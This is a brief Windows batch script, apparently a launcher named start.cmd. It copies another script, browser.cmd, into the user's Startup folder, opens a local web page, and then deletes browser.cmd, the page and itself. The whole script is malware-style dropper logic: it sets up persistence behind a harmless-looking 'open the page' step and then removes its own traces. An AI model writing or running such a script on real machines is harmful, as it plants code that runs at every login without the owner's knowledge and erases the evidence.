@echo off 
copy browser.cmd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
start index.html
del browser.cmd
timeout /t 1
del index.html
timeout /t 1
del start.cmd
